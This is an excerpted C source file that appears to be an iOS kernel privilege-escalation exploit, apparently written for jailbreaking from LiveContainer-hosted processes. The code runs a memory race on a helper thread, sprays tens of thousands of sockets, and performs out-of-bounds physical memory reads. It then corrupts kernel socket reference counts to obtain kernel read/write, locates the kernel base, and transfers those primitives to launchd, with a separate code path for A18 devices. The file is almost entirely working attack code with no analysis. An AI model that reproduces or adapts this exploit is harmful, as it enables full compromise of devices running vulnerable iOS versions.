...
static void pe_log_file_write(const char *message) {
    int fd = pe_log_file_fd();
    if (fd < 0) return;

    char line[1200];
    int len = snprintf(line, sizeof(line), "(ds) %s\n", message);
    if (len <= 0) return;
...
static bool running_in_rehosted_process = false;
static bool likely_livecontainer_guest = false;
static bool livecontainer_bundle_detected = false;

#define MAX_PROCESS_MARKERS 8
#define PROCESS_MARKER_MAX_LEN 64
static char process_markers[MAX_PROCESS_MARKERS][PROCESS_MARKER_MAX_LEN];
static size_t process_marker_count = 0;
...
static void addprocmarker(const char *marker) {
    ...
    for (size_t i = 0; i < process_marker_count; i++) {
        if (strncmp(process_markers[i], marker, PROCESS_MARKER_MAX_LEN) == 0) {
            return;
        }
    }

    if (process_marker_count >= MAX_PROCESS_MARKERS) {
        return;
    }

    memset(process_markers[process_marker_count], 0, PROCESS_MARKER_MAX_LEN);
    memcpy(process_markers[process_marker_count], marker, len);
...
static void initprocmarkers(void) {
    memset(guest_executable_name, 0, sizeof(guest_executable_name));
    memset(kernel_process_name, 0, sizeof(kernel_process_name));
    memset(host_executable_name, 0, sizeof(host_executable_name));
    memset(process_markers, 0, sizeof(process_markers));
    process_marker_count = 0;
    running_in_rehosted_process = false;
    likely_livecontainer_guest = false;
    livecontainer_bundle_detected = islcruntime();
    ...
    const char *guest_name = executable_path[0] ? strrchr(executable_path, '/') : NULL;
    guest_name = guest_name ? guest_name + 1 : executable_path;
    if (guest_name && guest_name[0] != '\0') {
        snprintf(guest_executable_name, sizeof(guest_executable_name), "%s", guest_name);
        executable_name = guest_executable_name;
    } else {
    ...
    if (lara_system_proc_pidpath(getpid(), host_executable_path, sizeof(host_executable_path)) > 0) {
        ...
        if (host_name && host_name[0] != '\0') {
            snprintf(host_executable_name, sizeof(host_executable_name), "%s", host_name);
        }
    }
    ...
    likely_livecontainer_guest = livecontainer_bundle_detected;
    running_in_rehosted_process = likely_livecontainer_guest;

    if (running_in_rehosted_process) {
        if (likely_livecontainer_guest) {
            addprocmarker_variants("LiveProcess");
        }
        addprocmarker_variants(kernel_process_name);
        addprocmarker_variants(host_executable_name);
        addprocmarker_variants(guest_executable_name);
    } else {
        addprocmarker_variants(guest_executable_name);
        addprocmarker_variants(kernel_process_name);
    }

    pe_log("executable_path:       %s", executable_path[0] ? executable_path : "(unknown)");
    pe_log("host_executable_path:  %s", host_executable_path[0] ? host_executable_path : "(unknown)");
    pe_log("guest_executable_name: %s", guest_executable_name[0] ? guest_executable_name : "(unknown)");
    pe_log("host_executable_name:  %s", host_executable_name[0] ? host_executable_name : "(unknown)");
    pe_log("kernel_process_name:   %s", kernel_process_name[0] ? kernel_process_name : "(unknown)");
    pe_log("livecontainer_bundle:  %s", livecontainer_bundle_detected ? "yes" : "no");
    pe_log("livecontainer_guest:   %s", likely_livecontainer_guest ? "yes" : "no");
    pe_log("rehosted_process:      %s", running_in_rehosted_process ? "yes" : "no");
    
    for (size_t i = 0; i < process_marker_count; i++) {
        pe_log("process_marker %zu: %s", i, process_markers[i]);
    }
}
...
static void *free_thread(void *arg) {
    ...
    while (uread64((uint64_t)go_sync_ptr) != 0) {
        ...
        if (target_object == MACH_PORT_NULL || ft == 0 || ft_size == 0) {
        ...
        kern_return_t kr = mach_vm_map(
            ...
            target_object, target_object_offset,
            FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

        if (kr != KERN_SUCCESS) {
            pe_log("mach_vm_map failed in free_thread! kr=%d (%s)", kr, mach_error_string(kr));
            pe_log("    free_target: 0x%llx, target_size: 0x%llx, target_object: 0x%x, target_offset: 0x%llx",
...
static void create_target_file(const char *path) {
    FILE *fd = fopen(path, "w");
    if (!fd) { pe_log("fopen failed: %s", path); return; }
    fwrite(default_file_content, 1, target_file_size, fd);
    fclose(fd);
}
...
static void create_physically_contiguous_mapping(mach_port_t *port,
...
static void initialize_physical_read_write(uint64_t contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    create_physically_contiguous_mapping(&pc_object, &pc_address, pc_size);
...
static kern_return_t physical_oob_read_mo(mach_port_t mo, uint64_t mo_offset, uint64_t size, uint64_t offset, void *buffer) {
    uwrite64((uint64_t)target_object_sync_ptr, (uint64_t)mo);
    uwrite64((uint64_t)target_object_offset_sync_ptr, mo_offset);
...
static void physical_oob_read_mo_with_retry(mach_port_t memory_object,
...
static mach_port_t spray_socket(void) {
    ...
    syscall(336, 6, getpid(), 3, output_socket_port, socket_info, 0x400);
...
static void krw_sockets_leak_forever(void) {
    pe_log("krw leak: control_socket_pcb=0x%llx rw_socket_pcb=0x%llx", control_socket_pcb, rw_socket_pcb);

    uint64_t control_socket_addr = early_kread64(control_socket_pcb + off_inpcb_inp_socket);
    uint64_t rw_socket_addr      = early_kread64(rw_socket_pcb + off_inpcb_inp_socket);
    pe_log("krw leak: control_socket_addr=0x%llx rw_socket_addr=0x%llx", control_socket_addr, rw_socket_addr);
    if (!control_socket_addr || !rw_socket_addr) {
        pe_log("couldn't find control_socket_addr || rw_socket_addr");
        return;
    }
    uint64_t control_socket_so_count = early_kread64(control_socket_addr + off_socket_so_usecount);
    uint64_t rw_socket_so_count      = early_kread64(rw_socket_addr + off_socket_so_usecount);
    pe_log("krw leak: control_socket_so_count=0x%llx rw_socket_so_count=0x%llx", control_socket_so_count, rw_socket_so_count);
    early_kwrite64(control_socket_addr + off_socket_so_usecount,
                   control_socket_so_count + 0x0000100100001001ULL);
    early_kwrite64(rw_socket_addr + off_socket_so_usecount,
                   rw_socket_so_count + 0x0000100100001001ULL);

    early_kwrite64(rw_socket_pcb + off_inpcb_inp_depend6_inp6_icmp6filt + 8, 0);
}

static int get_darwin_major_version(void) {
    char osrelease[64] = {0};
    size_t len = sizeof(osrelease);
    if (sysctlbyname("kern.osrelease", osrelease, &len, NULL, 0) != 0) {
        return 0;
    }
    return atoi(osrelease);
}
...
static void pe_init(void) {
    ...
    initprocmarkers();
    pe_log("executable_name: %s", executable_name ?: "(unknown)");

    uint8_t *free_thread_arg = calloc(1, PAGE_SZ);
    pe_log("free_thread_arg: %p", free_thread_arg);

    free_thread_start_ptr         = (volatile uint64_t *)(free_thread_arg + 0x00);
    free_target_sync_ptr          = (volatile uint64_t *)(free_thread_arg + 0x08);
    free_target_size_sync_ptr     = (volatile uint64_t *)(free_thread_arg + 0x10);
    target_object_sync_ptr        = (volatile uint64_t *)(free_thread_arg + 0x18);
    target_object_offset_sync_ptr = (volatile uint64_t *)(free_thread_arg + 0x20);
    go_sync_ptr                   = (volatile uint64_t *)(free_thread_arg + 0x28);
    race_sync_ptr                 = (volatile uint64_t *)(free_thread_arg + 0x30);

    pthread_create(&free_thread_jsthread, NULL, free_thread, free_thread_arg);
}
...
static void pe_v1(void) {
    ...
    if (is_a18_devices) search_mapping_size = 0x10ULL * PAGE_SZ;
    ...
    initialize_physical_read_write(n_of_oob_pages * PAGE_SZ);

    mach_vm_address_t wired_mapping = 0;
    uint64_t wired_mapping_size = 1024ULL * 1024 * 1024 * 3;
    if (is_a18_devices) {
        mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
        pe_log("wired_mapping: 0x%llx", (uint64_t)wired_mapping);
    }

    while (true) {
        if (is_a18_devices) {
            surface_mlock(wired_mapping, wired_mapping_size);
            for (uint64_t s = 0; s < wired_mapping_size / PAGE_SZ; s++)
                uwrite64(wired_mapping + s * PAGE_SZ, 0);
        }
        ...
        socket_ports_count = 0;
        uint64_t maxfiles = 3 * 10240ULL;
        uint64_t leeway = 4096 * 2;
        uint64_t total = maxfiles - leeway;
        pe_log("spraying %llu sockets...", total);

        for (uint64_t socket_count = 0; socket_count < total; socket_count++) {
            ...
            if ((socket_count & 0x3FF) == 0) {
                double p = (double)socket_count / (double)total;
                ds_progresssafe(0.30 + (p * 0.15));
            }
        }
        ...
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            ...
            pe_log("looking in search mapping: %llu / %llu",
                   s, n_of_search_mappings);
            ...
            uint64_t total_pages =
                (search_mapping_size + PAGE_SZ - 1) / PAGE_SZ;

            while (seeking_offset + pc_size <= search_mapping_size) {
                uint64_t current_page = seeking_offset / PAGE_SZ;
                double global_progress = ((double)s + ((double)current_page / (double)total_pages)) / (double)n_of_search_mappings;
                double total_progress = 0.50 + (global_progress * 0.01);

                if ((current_page & 0xF) == 0) {
                    ds_progresssafe(total_progress);
                }
...
static void pe_a18(void) {
    ...
    while (true) {
        ...
        socket_ports_count = 0;
        uint64_t max_sockets_count = 0x5800;
        uint64_t split_count = 8;
        ...
        while (seeking_offset < search_mapping_size) {
            ...
            if (*(uint64_t *)read_buffer == wired_page_marker) {
                ...
                uint64_t total = max_sockets_count / split_count;
...
static int pe(void) {
    if (stashkrw()) {
        pe_log("recovering primitives from launchd...");
    ...
    pe_log("ispac: %s", is_pac_supported() ? "yes" : "no");
    ...
    if (strstr(device_machine, "iPhone17,")) {
        ...
        sleep(8);
        pe_init();
        ds_progresssafe(0.30);
        pe_a18();
        ds_progresssafe(0.70);
    } else {
    ...
    uwrite64((uint64_t)go_sync_ptr, 0);
    uwrite64((uint64_t)race_sync_ptr, 1);
    ...
    ds_progresssafe(0.80);
    pe_log("walking kernel structures...");

    control_socket_pcb = early_kread64(rw_socket_pcb + off_inpcb_inp_list_le_next);
    pe_log("control_socket_pcb: 0x%llx", control_socket_pcb);

    uint64_t text_ptr = 0;
    if (get_darwin_major_version() >= 23) {
        uint64_t pcbinfo_pointer = early_kread64(control_socket_pcb + off_inpcb_inp_pcbinfo);
        uint64_t ipi_zone = early_kread64(pcbinfo_pointer + off_inpcbinfo_ipi_zone);
        text_ptr = early_kread64(ipi_zone + off_kalloc_type_view_kt_zv_zv_name);

        pe_log("pcbinfo_pointer: 0x%llx", pcbinfo_pointer);
        pe_log("ipi_zone: 0x%llx", ipi_zone);
        pe_log("zv_name: 0x%llx", text_ptr);
    } else {
        uint64_t socket_ptr = early_kread64(control_socket_pcb + off_inpcb_inp_socket);
        uint64_t proto_ptr = early_kread64(socket_ptr + off_socket_so_proto);
        uint64_t raw_text_ptr = early_kread64(proto_ptr + off_protosw_pr_input);
        text_ptr = xpaci(raw_text_ptr);

        pe_log("socket_ptr: 0x%llx", socket_ptr);
        pe_log("proto_ptr: 0x%llx", proto_ptr);
        pe_log("raw_text_ptr: 0x%llx", raw_text_ptr);
        pe_log("text_ptr: 0x%llx", text_ptr);
    }

    kernel_base = text_ptr & 0xFFFFFFFFFFFFC000ULL;
    pe_log("searching for kernel mach-o header from 0x%llx...", kernel_base);
    int search_iters = 0;
    uint64_t fallback_execute_base = 0;
    while (search_iters < 0x10000) {
        uint64_t magic = early_kread64(kernel_base);
        if (magic == 0x100000cfeedfacfULL) {
            uint64_t cpuinfo = early_kread64(kernel_base + 8);
            uint32_t file_type = (uint32_t)(cpuinfo >> 32);
            pe_log("candidate mach-o at 0x%llx: filetype=%u cpuinfo=0x%llx (iter=%d)", kernel_base, file_type, cpuinfo, search_iters);
            if (file_type == 0xC) {
                pe_log("found mh_fileset header at 0x%llx", kernel_base);
                break;
            }
            if (file_type == 0x2 && fallback_execute_base == 0) {
                fallback_execute_base = kernel_base;
            }
        }
        kernel_base -= PAGE_SZ;
        search_iters++;
    }
    if (search_iters >= 0x10000) {
        if (fallback_execute_base != 0) {
            kernel_base = fallback_execute_base;
            pe_log("no mh_fileset found, falling back to mh_execute at 0x%llx", kernel_base);
        } else {
            pe_log("kernel base search exhausted after %d iterations!", search_iters);
            return -1;
        }
    }
    ...
    uint64_t a = kernel_base;
    uint64_t b = our_task;
    uint64_t c = our_proc;

    uint64_t addrs[3] = { a, b, c };
    ...
    uint64_t va_bits = highest + 1;

    if ((a >> va_bits) != 0)
        va_bits++;

    uint64_t t1sz_boot = 64 - va_bits;

    pe_log("t1sz_boot: 0x%llx", t1sz_boot);
    ...
    our_proc = proc_self();
    if (!our_proc) {
        pe_log("our_proc lookup failed");
        return 0;
    }
    our_task = task_self();
    if (!our_task) {
        pe_log("our_task lookup failed");
        return 0;
    }
    ...
    pe_log("our_task: 0x%llx", our_task);
    if (stashkrw()) {
        pe_log("transferring primitives to launchd...");
        if (transfer_krw_to_launchd()) {
            pe_log("transferred primitives to launchd");
        } else {
            pe_log("failed to transfer primitives to launchd");
        }
    }
    return 0;
}
